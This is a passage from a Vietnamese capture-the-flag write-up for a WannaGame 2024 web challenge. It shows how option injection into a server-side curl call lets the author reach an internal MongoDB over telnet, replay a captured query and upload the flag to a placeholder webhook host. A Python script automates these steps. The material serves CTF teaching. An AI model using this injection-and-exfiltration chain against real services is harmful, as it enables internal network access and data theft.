    <span class="kd">const</span> <span class="nx">flag</span> <span class="o">=</span> <span class="nx">client</span><span class="p">.</span><span class="nf">db</span><span class="p">(</span> <span class="dl">"</span><span class="s2">secret</span><span class="dl">"</span> <span class="p">).</span><span class="nf">collection</span><span class="p">(</span> <span class="dl">"</span><span class="s2">flag</span><span class="dl">"</span> <span class="p">);</span>
    <span class="kd">var</span> <span class="nx">flag_1</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">flag</span><span class="p">.</span><span class="nf">findOne</span><span class="p">()</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">flag_1</span><span class="p">);</span>
    <span class="nx">client</span><span class="p">.</span><span class="nf">close</span><span class="p">();</span>
<span class="p">}</span> <span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Đây là nội dung lúc giao tiếp với server</p>

<p><a href="/assets/wannagame/9.png" class="popup img-link  shimmer"><img src="/assets/wannagame/9.png" alt="alt text" loading="lazy"></a></p>

<p>Ta có thể tải nội dung TCP payload về, đây chính là quá trình mà server giao tiếp với database</p>

<p>Thử dùng file này để giao tiếp xem có được không</p>

<p><a href="/assets/wannagame/10.png" class="popup img-link  shimmer"><img src="/assets/wannagame/10.png" alt="alt text" loading="lazy"></a></p>

<p>Nó có trả về flag vậy có nghĩa là chúng ta có thể dùng cách này</p>

<p>Vậy cuối cùng đây là cách làm</p>

<ul>
  <li>Tải file options với nội dung bên dưới <code class="language-plaintext highlighter-rouge">url=http://NGROKSERVER.com/options.txt&amp;opt=-o&amp;data=GET</code></li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>--max-time 1
--upload-file "POST"
--url "telnet://mongodb:27017"
-o "GET"
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>
    <p>Tiếp theo tải file data tcp mà ta bắt được vào server <code class="language-plaintext highlighter-rouge">url=http://NGROKSERVER.com/test.data.dat&amp;opt=-o&amp;data=POST</code></p>
  </li>
  <li>
    <p>Sau đó request đến một trang web bất kỳ với option là file GET(options mà ta lúc nãy gửi) <code class="language-plaintext highlighter-rouge">url=http://ABCXYZ.COM&amp;opt=-K&amp;data=GET</code> ( lúc này là lúc mà chúng ta giao tiếp với database để lấy flag và lưu vào GET)</p>
  </li>
  <li>
    <p>Cuối cùng là upload file GET về server của ta <code class="language-plaintext highlighter-rouge">url=http://WEBHOOKSERVER.COM&amp;opt=-T&amp;data=GET</code></p>
  </li>
</ul>

<p>Payload tự động lấy flag</p>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">time</span>

<span class="c1"># URL = "http://localhost:8888"
</span><span class="n">URL</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://45.122.249.68:20014</span><span class="sh">"</span>

<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">url</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">https://NGROKSERVER/options.txt</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">opt</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">-o</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">data</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">GET</span><span class="sh">"</span>
<span class="p">}</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">URL</span><span class="si">}</span><span class="s">/api/curr</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>

<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">url</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">https://NGROKSERVER/test.data.dat</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">opt</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">-o</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">data</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">POST</span><span class="sh">"</span>
<span class="p">}</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">URL</span><span class="si">}</span><span class="s">/api/curr</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>

<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">url</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">http://ABCXYZ.COM</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">opt</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">-K</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">data</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">GET</span><span class="sh">"</span>
<span class="p">}</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">URL</span><span class="si">}</span><span class="s">/api/curr</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>

<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">url</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">http://WEBHOOKSERVER.COM</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">opt</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">-T</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">data</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">GET</span><span class="sh">"</span>
<span class="p">}</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">URL</span><span class="si">}</span><span class="s">/api/curr</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>


</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/wannagame/11.png" class="popup img-link  shimmer"><img src="/assets/wannagame/11.png" alt="alt text" loading="lazy"></a></p>

<p><strong><code class="language-plaintext highlighter-rouge">Flag: W1{nice_try_without_gopher}</code></strong></p>

<p>Kết bài</p>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/ctf-writeup/">CTF Writeup</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/nodejs/"
            class="post-tag no-text-decoration"
          >NodeJS</a>
        
          <a
            href="/tags/bypass-filter/"
            class="post-tag no-text-decoration"
          >Bypass Filter</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=WannaGame%20-%20Yuu's%20blog&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FWannagame2024%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=WannaGame%20-%20Yuu's%20blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FWannagame2024%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FWannagame2024%2F&text=WannaGame%20-%20Yuu's%20blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Wannagame2024/">WannaGame</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/KCSCCTF/">KCSC 2024</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/W1Playground/">W1 Playground Writeup</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Wannagame-Freshman/">Wannagame Freshman CTF writeup</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/GreyCTF/">GreyCTF 2024</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/bypass-filter/">Bypass Filter</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ssti/">SSTI</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/api-testing/">API testing</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/base64/">Base64</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/flask/">Flask</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/mysql/">MYSQL</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/nodejs/">NodeJS</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/nosql/">NoSQL</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/path-traversal/">Path Traversal</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/php-webshell/">PHP Webshell</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->














  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/PicoCTF2024/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1711555200"
  data-df="ll"
  
>
  Mar 27, 2024
</time>

              <h4 class="pt-0 my-2">PicoCTF 2024</h4>
              <div class="text-muted">
                <p>PicoCTF2024 đã kết thúc, giải này mình có khá nhiều nuối tiếc vì bài cuối web quá khó, dù không clear nhưng team Zafk1el tụi mình đã cố gắng hết sức. Tiện đây mình viết writeup một số bài đáng chú ...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/AsisCTF/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1695571200"
  data-df="ll"
  
>
  Sep 24, 2023
</time>

              <h4 class="pt-0 my-2">Asis CTF 2023 Writeup</h4>
              <div class="text-muted">
                <p>Asis-CTF-2023-Writeup
Bài 1 hello:

  Tóm tắt đề thì đại khái là đề bảo chúng ta phải request một cái method get có parameter là x lên Web sao cho không có chữ next và chữ file là được, nhưng mà mu...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/Wannagame-Freshman/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1699718400"
  data-df="ll"
  
>
  Nov 11, 2023
</time>

              <h4 class="pt-0 my-2">Wannagame Freshman CTF writeup</h4>
              <div class="text-muted">
                <p>WannaWinFreshman-Writeup
Bài 1 Warmup PHP:



  Tóm tắt đề thì đại khái là đề bảo chúng ta phải POST data lên dưới dạng json có key là page và sau đó chương trình sẽ server sẽ decode ra và đọc file...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/KCSCCTF/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>KCSC 2024</p>
    </a>
  

  
    <div class="btn btn-outline-primary disabled" aria-label="Newer">
      <p>-</p>
    </div>
  
</nav>

            
              
              <!-- The comments switcher -->


            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2024</time>

    
      <a href="https://github.com/anzuukino">Yuu</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="v6.5.5"
        href="https://github.com/cotes2020/jekyll-theme-chirpy"
        target="_blank"
        rel="noopener"
      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/bypass-filter/">Bypass Filter</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ssti/">SSTI</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/api-testing/">API testing</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/base64/">Base64</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/flask/">Flask</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/mysql/">MYSQL</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/nodejs/">NodeJS</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/nosql/">NoSQL</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/path-traversal/">Path Traversal</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/php-webshell/">PHP Webshell</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->




  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.25.0/dist/tocbot.min.js"></script>






<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  





    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5">Oops! No results found.</p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

